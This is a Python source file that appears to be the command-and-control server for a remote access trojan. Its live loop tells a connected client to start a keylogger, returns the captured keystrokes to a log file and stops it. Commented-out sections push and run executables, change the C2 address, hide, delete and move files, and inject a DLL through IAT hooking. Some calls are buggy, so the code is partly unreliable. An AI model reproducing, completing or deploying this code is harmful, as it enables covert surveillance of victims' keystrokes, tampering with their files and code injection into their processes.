#!/usr/bin/env python
import socket
from threading import Thread

from SocketManager import SocketManager

IAT_HOOKING_PROCESS_ID = 4604
IAT_HOOKING_DLL = r"IAT Hooking\IATHookingDLL.dll"
KEY_LOGGER_FILE = r"keyLogger.txt"
HIDDEN_FILE_PATH = r"C:\Users\admin\Desktop\hidden files.txt"
DIR_TO_MOVE = r"C:\Users\admin\Desktop\New folder"
FILE_TO_MOVE = r"C:\Users\admin\Desktop\hidden files.txt"
FILE_PATH = "C:\\Users\\admin\\Downloads\\calc.exe"
FILE_INFO_DIR = r"C:\Users\admin\Desktop\New folder"
EXE_STR = "netstat -a -n -o"
NEW_IP = "192.168.43.49"
NEW_PORT = 4001
CHUNK_SIZE = 1024


def bin_file_to_buffer(file_path):
    """Lazy function (generator) to read a file piece by piece.
    Default chunk size: 1k."""
    with open(file_path, 'rb') as fp:
        while True:
            data1 = fp.read(CHUNK_SIZE)
            if not data1:
                break
            yield data1

def full_bin_file_to_buffer(file_path):
    with open(file_path, 'rb') as fp:
        data = fp.read()

    return data

# def key_logger_thread(conn, log_file_path):
#     while 1:
#         logger_message = SocketManager.receive(conn)
#         if logger_message == 'KEY_LOGGER_MESSAGE':
#             logger_data = SocketManager.receive(conn)
#             try:
#                 with open(log_file_path, 'w') as fp:
#                     fp.write(logger_data)
#             except Exception as ex:
#                 print("Directory does not exist")
#                 print(ex)
#                 # TODO: handle what happens if directory does not exist
#
#
#
#         # TODO: handle what happens if it's not the right message


if __name__ == '__main__':
    TCP_IP = '10.0.0.1'
    TCP_PORT = 5007

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((TCP_IP, TCP_PORT))
    s.listen(1)

    conn, addr = s.accept()
    is_running_key_logger = False

    print('Connection address:', addr)
    while 1:
        data = SocketManager.receive(conn)
        if not data: break
        print('received data:', data)
        SocketManager.send_data(conn, data)

        # # UPDATE:
        # conn.send("UPDATE".encode())
        # data = conn.recv(BUFFER_SIZE)  # ok for packgae
        # for chunk in bin_file_to_buffer(FILE_PATH):
        #     packet = chunk
        #     print(packet)
        #     conn.send(packet)
        #     data = conn.recv(BUFFER_SIZE)  # ok for packgae
        # conn.send("END_UPDATE".encode())
        # data = conn.recv(BUFFER_SIZE)  # ok for packgae

        # Execute
        # SocketManager.send_data(conn, "EXECUTE")
        # packet = EXE_STR
        # SocketManager.send_data(conn, packet)
        #
        # data = SocketManager.receive(conn)
        #
        # print(data)  # TODO handle /n
        #
        # # Change IP
        # while True: # TODO: timeout or scheduler
        #     SocketManager.send_data(conn, "CHANGE_IP")
        #     packet_str = "%s:%s" % (NEW_IP, NEW_PORT)
        #     SocketManager.send_data(conn, packet_str)
        #     response_from_client = SocketManager.receive(conn)
        #     if response_from_client == 'accept':
        #         print(response_from_client)
        #         break
        #     else:
        #         print(response_from_client)
        #
        # # file system info
        # SocketManager.send_data(conn, "FILE_SYSTEM_INFO")
        # SocketManager.send_data(conn, FILE_INFO_DIR)
        # data = SocketManager.receive(conn)
        # print(data)
        #
        # show hidden file
        # SocketManager.send_data(conn, "SHOW_HIDDEN_FILE")
        # SocketManager.send_data(conn, HIDDEN_FILE_PATH)
        # data = SocketManager.receive(conn)
        # print(data)
        #
        # # hide file
        # SocketManager.send_data(conn, "HIDE_FILE")
        # SocketManager.send_data(conn, HIDDEN_FILE_PATH)
        # data = SocketManager.receive(conn)
        # print(data)

        # delete file
        # SocketManager.send_data(conn, "DELETE_FILE")
        # SocketManager.send_data(conn, FILE_TO_MOVE)
        # data = SocketManager.receive(conn)
        # print(data)

        # move file to other directory
        # SocketManager.send_data(conn, "MOVE_FILE")
        # SocketManager.send_data(conn, FILE_TO_MOVE)
        # SocketManager.send_data(conn, DIR_TO_MOVE)
        # data = SocketManager.receive(conn)
        # print(data)

        # start key logger
        SocketManager.send_data(conn, "START_KEY_LOGGER")

        # get key_logger_data
        SocketManager.send_data(conn, "GET_KEY_LOGGER_DATA")
        key_logger_data = SocketManager.receive(data)
        try:
            with open(KEY_LOGGER_FILE, 'a') as fp:
                fp.write(key_logger_data)

        except Exception as ex:
            print("Error openning file")
            print(ex)

        # stop key logger
        SocketManager.send_data(conn, "STOP_KEY_LOGGER")
        if not is_running_key_logger:
            print("Currently, no key logger is running...")

        # IAT Hooking
        # SocketManager.send_data(conn, "IAT_HOOKING")
        # SocketManager.send_data(conn, str(IAT_HOOKING_PROCESS_ID))
        # dll_data = full_bin_file_to_buffer(IAT_HOOKING_DLL)
        # SocketManager.send_data(conn, dll_data)

conn.close()
